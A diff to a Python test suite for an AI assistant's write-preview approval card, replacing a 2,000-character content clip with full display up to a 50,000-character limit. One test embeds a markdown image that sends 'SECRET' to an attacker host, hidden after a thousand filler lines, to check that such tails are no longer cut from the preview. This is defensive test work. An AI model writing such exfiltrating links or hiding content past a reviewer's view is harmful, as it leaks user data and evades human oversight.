@@ -11,7 +11,7 @@ from pydantic.fields import FieldInfo
 
 from pkm import batch as batch_module
 from pkm.assistant.policy import WRITE_PREVIEW_FIELDS, WRITE_TOOLS
-from pkm.assistant.write_preview import (CONTENT_CLIP_CHARS, PreviewOp,
+from pkm.assistant.write_preview import (CONTENT_LIMIT_CHARS, PreviewOp,
                                          Refusal, WritePreview,
                                          build_write_preview)
 from pkm.client.workflows import LinkedUpload
@@ -34,14 +34,45 @@ def _refusal(short: str, raw: dict[str, object]) -> Refusal:
     return out
 
 
-def test_targets_come_first_and_unclipped():
+def test_targets_come_first_and_content_is_sent_in_full():
     p = _preview("update_block", {"text": "x" * 10_000,
                                   "uid": "VICTIMUID01"})
     op = p.ops[0]
     assert op.action == "update block"
     assert op.targets[0] == ("uid", "VICTIMUID01")
-    assert op.content[0] == ("text", "x" * CONTENT_CLIP_CHARS, 10_000)
-    assert CONTENT_CLIP_CHARS == 2000
+    assert op.content[0] == ("text", "x" * 10_000, 10_000)
+
+
+def test_content_tail_reaches_the_card():
+    # past the old 2000-character clip: an image fetching an attacker URL
+    hidden = "![](https://evil.example/x?d=SECRET)"
+    p = _preview("save_note", {"text": "ok\n" * 1000 + hidden})
+    ((_, shown, total),) = p.ops[0].content
+    assert shown.endswith(hidden) and total == len(shown)
+
+
+def test_content_at_the_limit_is_previewed():
+    assert CONTENT_LIMIT_CHARS == 50_000
+    p = _preview("save_note", {"text": "x" * CONTENT_LIMIT_CHARS})
+    assert p.ops[0].content[0][2] == CONTENT_LIMIT_CHARS
+
+
+@pytest.mark.parametrize(("short", "raw", "message"), [
+    ("save_note", {"text": "x" * 50_001},
+     "save_note: text is 50001 characters; split the write into parts "
+     "under 50000"),
+    ("update_block", {"uid": "U1", "text": "x" * 60_000},
+     "update_block: text is 60000 characters; split the write into parts "
+     "under 50000"),
+    ("batch", {"commands": [
+        {"command": "delete", "params": {"uid": "U1"}},
+        {"command": "outline", "params": {"page": "P",
+                                          "items": ["x" * 50_001]}}]},
+     "batch item 1: items is 50001 characters; split the write into parts "
+     "under 50000"),
+])
+def test_content_over_the_limit_is_refused(short, raw, message):
+    assert _refusal(short, raw).message == message
 
 
 def test_batch_params_never_clip_a_uid():
@@ -51,7 +82,7 @@ def test_batch_params_never_clip_a_uid():
     op = p.ops[0]
     assert op.action == "update block"
     assert op.targets == [("uid", uid)]
-    assert op.content == [("text", "y" * 2000, 5000)]
+    assert op.content == [("text", "y" * 5000, 5000)]
 
 
 _THREE = [
